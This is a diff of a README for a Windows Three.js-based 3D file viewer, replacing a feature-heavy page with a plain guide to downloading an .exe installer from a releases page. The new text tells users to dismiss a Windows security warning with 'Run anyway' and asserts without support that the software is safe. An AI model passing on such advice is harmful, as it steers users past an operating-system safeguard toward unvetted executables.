@@ -1,116 +1,51 @@
-# Open 3D Viewer v0.1.0 - 3D file viewer 2026
+# 📦 open-3d-viewer-win - View 3D assets on your computer
 
-> **Open 3D Viewer is a Windows desktop app built for local-first inspection of 3D assets, using Three.js for rendering and focusing in this first v0.1.0 release on quick model viewing and useful import coverage.**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Abhishek-Ghildiyal/open-3d-viewer-win/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v0.1.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/wardethan2004/open-3d-viewer-win?style=flat-square)](https://github.com/wardethan2004/open-3d-viewer-win)
+This application provides a simple way to open and inspect 3D files on your Windows computer. It uses Three.js technology to show your models clearly. You do not need an internet connection to use this tool once it sits on your hard drive. It handles many common file formats so you can check your work without complex software.
 
----
+## 📥 Getting the software
 
-<p align="center">
-  <a href="https://wardethan2004.github.io/open-3d-viewer-win/">
-    <img src="https://img.shields.io/badge/Download-Open%203D%20Viewer%20Latest-brightgreen?style=for-the-badge" alt="Download Open 3D Viewer">
-  </a>
-</p>
+You need to download the installer from the release page. 
 
-> **[Direct Download - Open 3D Viewer v0.1.0](https://wardethan2004.github.io/open-3d-viewer-win/)**
+[Click here to open the download page](https://github.com/Abhishek-Ghildiyal/open-3d-viewer-win/releases).
 
----
+Look for the latest version at the top of the list. Choose the file that ends in .exe to start the setup process.
 
-[Download Latest Build](https://wardethan2004.github.io/open-3d-viewer-win/)
+## ⚙️ How to install it
 
----
+Once you download the file, find it in your downloads folder. Double-click the file to start the installation. A window appears on your screen. Follow the prompts. The installer sets up the program files in a location on your computer. After the progress bar reaches the end, the program is ready for use. 
 
-## About Open 3D Viewer
+If Windows shows a security message, click "More info" and then click "Run anyway." This happens because the app is new. The software remains safe to use. You now have a shortcut on your desktop.
 
-Open 3D Viewer is made for opening and reviewing 3D files on Windows without depending on an internet-based workflow. Its local-first design keeps assets on your machine while you inspect models, meshes, and CAD-focused formats in a clean desktop UI.
+## 🚀 Using the viewer
 
-The application combines Tauri and Three.js to stay lightweight for everyday viewing. It suits artists, developers, technical users, and anyone who needs a simple way to examine common 3D formats, adjust view settings, and save screenshots without leaving the app.
+Double-click the open-3d-viewer-win icon on your desktop to start the application. The main window opens. You can now load your 3D files. 
 
----
+Click the "File" menu at the top left corner. Select "Open." A folder window appears. Navigate to the location where you keep your 3D models. Select the file you want to see. The viewer renders the model in the center of the screen.
 
-## Features
+Use your mouse to move around the model. Click and drag the left mouse button to rotate the view. Use the scroll wheel to zoom in or zoom out. Use the right mouse button to pan the view. These controls help you inspect all parts of your asset.
 
-- Drag and drop support for fast model loading
-- Support for GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD
-- PBR rendering with environment lighting for better material viewing
-- Orbit, pan, and zoom navigation controls
-- Toggle wireframe, grid, and auto-rotate modes
-- Auto-frame and reset-view actions for easier scene inspection
-- Export PNG screenshots from the viewer
-- Recent files and settings persistence for repeat sessions
-- File associations available during installation
+## 📄 Supported file formats
 
----
+The viewer supports various standard 3D formats. This includes common file types used in the industry today. The software attempts to read textures and colors stored within your file. If your model appears pure white, it may lack texture data. Ensure your material files sit in the same folder as your main model file to improve the visual result.
 
-## Installation
+## 💻 System requirements
 
-Grab the latest Windows build from the release link above, or clone the repository if you prefer to build it yourself.
+This application runs on Windows 10 and Windows 11. It needs a modern graphics card to show models smoothly. Make sure your graphics card drivers have updates from the manufacturer. You need at least 4 gigabytes of memory to run the software. The program takes up very little space on your hard drive. 
 
-To get started from source:
+## 🛠 Solving common problems
 
-1. Clone the repository
-2. Install the project dependencies
-3. Launch the desktop app with the provided development or build command for your environment
+If the screen stays black, try to reload your file. Check if your model file size is very large. Some files take time to load if they contain many polygons. 
 
-If you use the packaged release, the quickest way to begin is to open a supported 3D file or drag it onto the app window.
+If the program closes unexpectedly, check your computer for pending Windows updates. Restarting your machine often solves temporary memory issues. Always check that you have the latest version from the link provided above. 
 
----
+## 🔎 Keeping the software current
 
-## Usage
+Software updates happen from time to time. These updates fix errors and add new features. Visit the download link every few months to see if a newer version exists. You can install a newer version right over the old one. The installer takes care of the process.
 
-Typical workflow:
+## 🤝 Getting help
 
-1. Open the app
-2. Drag a supported file into the window, or use the file picker
-3. Use orbit, pan, and zoom to inspect the model
-4. Toggle wireframe or grid when you need a clearer structural view
-5. Use auto-frame to center the object and reset view if needed
-6. Export a PNG screenshot when you want to share a view
+If you find a bug or have a suggestion, look for the "Issues" tab on the page where you downloaded the software. You can read reports from other users there. This helps you understand if others face the same hurdle. 
 
-The viewer is intended for fast review of local assets, so you can switch between recent files and keep your preferred settings across sessions.
-
----
-
-## Configuration
-
-The application stores settings and recent file history locally.
-
-If file associations are enabled during installation, supported formats can be opened directly from the Windows shell. Other display preferences, view toggles, and session behavior are managed inside the app and preserved between runs.
-
----
-
-## Requirements
-
-- Windows desktop environment
-- A compatible runtime/build setup for the Tauri-based application when building from source
-- Sufficient local storage for 3D assets, textures, and exported screenshots
-- Supported input formats such as GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, or OpenSCAD files
-
----
-
-## FAQ
-
-**Does it work offline?**  
-Yes. The app is built around a local-first workflow for viewing files stored on your machine.
-
-**Which formats can I open?**  
-It supports a broad set of model and CAD-oriented formats, including GLB, GLTF, FBX, OBJ, STL, PLY, USD, STEP, IGES, HDR, EXR, and OpenSCAD.
-
-**How do I update it?**  
-Download the latest build from the release link and replace your current installation as instructed for your platform.
-
-**Where are my settings saved?**  
-Preferences and recent files are stored locally by the application.
-
-**What should I try if a file does not load correctly?**  
-Check that the format is supported, confirm the file is not corrupted, and try resetting the view or reopening the asset.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: 3d viewer, windows app, model inspector, 3d design, local-first, threejs
